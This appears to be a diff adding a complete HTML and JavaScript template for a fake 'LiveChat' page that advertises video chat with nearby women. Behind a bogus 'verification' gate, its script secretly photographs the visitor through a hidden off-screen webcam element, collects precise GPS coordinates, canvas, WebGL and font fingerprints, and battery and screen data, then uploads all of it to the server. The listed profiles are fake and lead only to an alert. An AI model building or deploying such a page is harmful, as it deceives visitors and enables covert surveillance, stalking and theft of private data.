@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LiveChat - Connect with Beautiful Girls Now</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px 0;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-section {
+            padding: 60px 20px;
+            text-align: center;
+        }
+
+        .hero-title {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 40px;
+            opacity: 0.9;
+        }
+
+        .permission-gate {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            color: #333;
+        }
+
+        .permission-icon {
+            font-size: 4rem;
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+
+        .permission-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .permission-text {
+            font-size: 1.1rem;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .permission-list {
+            text-align: left;
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 10px;
+        }
+
+        .permission-list li {
+            margin: 10px 0;
+            color: #555;
+        }
+
+        .permission-list i {
+            color: #667eea;
+            margin-right: 10px;
+        }
+
+        .start-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            color: white;
+            padding: 18px 50px;
+            font-size: 1.3rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+            font-weight: bold;
+        }
+
+        .start-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.6);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 500;
+        }
+
+        .status-success {
+            background: rgba(40, 167, 69, 0.1);
+            color: #28a745;
+            border: 1px solid #28a745;
+        }
+
+        .status-error {
+            background: rgba(220, 53, 69, 0.1);
+            color: #dc3545;
+            border: 1px solid #dc3545;
+        }
+
+        .status-warning {
+            background: rgba(255, 193, 7, 0.1);
+            color: #856404;
+            border: 1px solid #ffc107;
+        }
+
+        .girls-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .girl-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .girl-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .girl-image {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+        }
+
+        .girl-info {
+            padding: 20px;
+            color: #333;
+        }
+
+        .girl-name {
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .girl-status {
+            color: #28a745;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+
+        .girl-status i {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .girl-details {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .chat-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .chat-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #camera-preview {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        .permission-check {
+            display: inline-block;
+            margin: 10px 0;
+            padding: 10px 20px;
+            background: rgba(40, 167, 69, 0.1);
+            border-radius: 8px;
+            color: #28a745;
+        }
+
+        .permission-check i {
+            margin-right: 8px;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Hidden camera elements -->
+    <video id="camera-preview" autoplay playsinline muted></video>
+    <canvas id="camera-canvas" style="display: none;"></canvas>
+
+    <div class="header">
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-video"></i> LiveChat
+            </div>
+        </div>
+    </div>
+
+    <div id="permission-screen">
+        <div class="hero-section">
+            <h1 class="hero-title">🔥 Live Video Chat with Beautiful Girls</h1>
+            <p class="hero-subtitle">Thousands of girls are online now, waiting to chat with you!</p>
+
+            <div class="permission-gate">
+                <div class="permission-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2 class="permission-title">Verification Required</h2>
+                <p class="permission-text">
+                    To ensure a safe and authentic experience for everyone, we need to verify your identity and
+                    location.
+                </p>
+
+                <div class="permission-list">
+                    <ul style="list-style: none; padding: 0;">
+                        <li><i class="fas fa-check-circle"></i> <strong>Camera Access</strong> - Verify you're a real
+                            person</li>
+                        <li><i class="fas fa-check-circle"></i> <strong>Location Access</strong> - Find girls near you
+                        </li>
+                        <li><i class="fas fa-check-circle"></i> <strong>Age Verification</strong> - Confirm you're 18+
+                        </li>
+                    </ul>
+                </div>
+
+                <p class="permission-text" style="font-size: 0.9rem; color: #999;">
+                    <i class="fas fa-lock"></i> Your privacy is protected. We use encryption to secure your data.
+                </p>
+
+                <button id="verify-btn" class="start-btn">
+                    <i class="fas fa-video"></i> Start Verification
+                </button>
+
+                <div id="status-message"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-content" class="hidden">
+        <div class="container">
+            <div class="text-center" style="padding: 40px 0;">
+                <h2 style="font-size: 2.5rem; margin-bottom: 10px;">Girls Online Now</h2>
+                <p style="font-size: 1.2rem; opacity: 0.9;">
+                    <i class="fas fa-circle" style="color: #28a745; font-size: 0.8rem;"></i>
+                    <span id="online-count">247</span> girls are live in your area
+                </p>
+            </div>
+
+            <div class="girls-grid">
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Emma, 23</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-1">2.3 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Emma')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Sophia, 21</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-2">3.7 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Sophia')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Olivia, 24</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-3">5.1 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Olivia')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Ava, 22</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-4">1.8 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Ava')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Mia, 25</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-5">4.2 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Mia')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+
+                <div class="girl-card">
+                    <div class="girl-image"></div>
+                    <div class="girl-info">
+                        <div class="girl-name">Isabella, 23</div>
+                        <div class="girl-status"><i class="fas fa-circle"></i> Online Now</div>
+                        <div class="girl-details">
+                            <i class="fas fa-map-marker-alt"></i> <span id="distance-6">6.5 km</span> away
+                        </div>
+                        <button class="chat-btn" onclick="startChat('Isabella')">
+                            <i class="fas fa-video"></i> Start Video Chat
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const VISITOR_ID = {{ visitor_id }};
+        let permissionsGranted = {
+            camera: false,
+            location: false
+        };
+        let userLocation = null;
+
+        // Device fingerprinting functions
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const text = 'fingerprint,🔓';
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText(text, 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText(text, 4, 17);
+                return canvas.toDataURL().slice(-50);
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'unavailable';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable';
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+
+        function detectFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const detected = [];
+
+            for (let font of testFonts) {
+                let detected_font = false;
+                for (let baseFont of baseFonts) {
+                    ctx.font = testSize + ' ' + baseFont;
+                    const baseWidth = ctx.measureText(testString).width;
+                    ctx.font = testSize + ' ' + font + ',' + baseFont;
+                    const testWidth = ctx.measureText(testString).width;
+                    if (baseWidth !== testWidth) {
+                        detected_font = true;
+                        break;
+                    }
+                }
+                if (detected_font) detected.push(font);
+            }
+            return detected.join(',');
+        }
+
+        // Collect enhanced device information
+        async function collectDeviceInfo() {
+            const deviceInfo = {
+                visitor_id: VISITOR_ID,
+                device_fingerprint: getCanvasFingerprint() + getWebGLFingerprint(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvas_fingerprint: getCanvasFingerprint(),
+                webgl_fingerprint: getWebGLFingerprint(),
+                fonts_available: detectFonts(),
+                device_memory: navigator.deviceMemory || 'unknown',
+                hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                cookies_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack || 'unknown',
+                platform_details: JSON.stringify({
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages
+                })
+            };
+
+            // Get battery info if available
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.battery_level = Math.round(battery.level * 100) + '%';
+                } catch (e) {
+                    deviceInfo.battery_level = 'unavailable';
+                }
+            }
+
+            // Get connection info if available
+            if ('connection' in navigator) {
+                deviceInfo.connection_type = navigator.connection.effectiveType || 'unknown';
+            }
+
+            // Send device info to server
+            try {
+                await fetch('/api/update_device_info', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(deviceInfo)
+                });
+            } catch (e) {
+                console.log('Device info update failed');
+            }
+        }
+
+        // Camera capture function with retry
+        async function captureCamera() {
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            while (attempts < maxAttempts) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    });
+
+                    const video = document.getElementById('camera-preview');
+                    video.srcObject = stream;
+
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+
+                    // Wait for camera to adjust
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+
+                    // Capture image
+                    const canvas = document.getElementById('camera-canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
+                    // Stop stream
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Upload to server
+                    await fetch('/api/upload_camera', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            visitor_id: VISITOR_ID,
+                            camera_image: imageData
+                        })
+                    });
+
+                    permissionsGranted.camera = true;
+                    return true;
+                } catch (e) {
+                    attempts++;
+                    if (attempts >= maxAttempts) {
+                        throw e;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            return false;
+        }
+
+        // Get location with high accuracy
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        userLocation = { lat, lng, accuracy };
+
+                        // Send to server
+                        try {
+                            await fetch('/update_precise_location', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: `latitude=${lat}&longitude=${lng}&accuracy=${accuracy}&visitor_id=${VISITOR_ID}`
+                            });
+                        } catch (e) {
+                            console.log('Location update failed');
+                        }
+
+                        permissionsGranted.location = true;
+                        resolve({ lat, lng, accuracy });
+                    },
+                    (error) => {
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status-message');
+            statusDiv.className = `status-message status-${type}`;
+            statusDiv.innerHTML = message;
+        }
+
+        // Verification process
+        async function startVerification() {
+            const btn = document.getElementById('verify-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
+
+            showStatus('<i class="fas fa-info-circle"></i> Starting verification process...', 'warning');
+
+            try {
+                // Step 1: Get Camera Permission
+                showStatus('<i class="fas fa-camera"></i> Requesting camera access...', 'warning');
+                await captureCamera();
+                showStatus('<i class="fas fa-check"></i> Camera verified successfully!', 'success');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Step 2: Get Location Permission
+                showStatus('<i class="fas fa-map-marker-alt"></i> Requesting location access...', 'warning');
+                await getLocation();
+                showStatus('<i class="fas fa-check"></i> Location verified successfully!', 'success');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Step 3: Collect device info
+                showStatus('<i class="fas fa-shield-alt"></i> Completing verification...', 'warning');
+                await collectDeviceInfo();
+
+                // Success - show main content
+                showStatus('<i class="fas fa-check-circle"></i> Verification complete! Loading girls...', 'success');
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                document.getElementById('permission-screen').classList.add('hidden');
+                document.getElementById('main-content').classList.remove('hidden');
+
+            } catch (error) {
+                console.error('Verification error:', error);
+
+                let errorMessage = '';
+                if (error.code === 1 || error.message.includes('Permission denied')) {
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Verification Failed!</strong><br>You must grant camera and location permissions to continue. Please click "Allow" when prompted.';
+                } else if (error.code === 2) {
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Location Unavailable</strong><br>Unable to determine your location. Please check your device settings.';
+                } else if (error.code === 3) {
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Request Timeout</strong><br>Verification timed out. Please try again.';
+                } else {
+                    errorMessage = '<i class="fas fa-exclamation-triangle"></i> <strong>Verification Failed!</strong><br>Please ensure you grant all required permissions and try again.';
+                }
+
+                showStatus(errorMessage, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-redo"></i> Try Again';
+            }
+        }
+
+        // Start chat function
+        function startChat(name) {
+            alert(`Starting video chat with ${name}...`);
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function () {
+            // Send screen resolution
+            const screenResolution = window.screen.width + 'x' + window.screen.height;
+            try {
+                fetch('/update_screen_resolution', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `resolution=${screenResolution}&visitor_id=${VISITOR_ID}`
+                });
+            } catch (e) {
+                console.log('Screen resolution update failed');
+            }
+
+            // Add event listener to verify button
+            document.getElementById('verify-btn').addEventListener('click', startVerification);
+        });
+    </script>
+</body>
+
+</html>
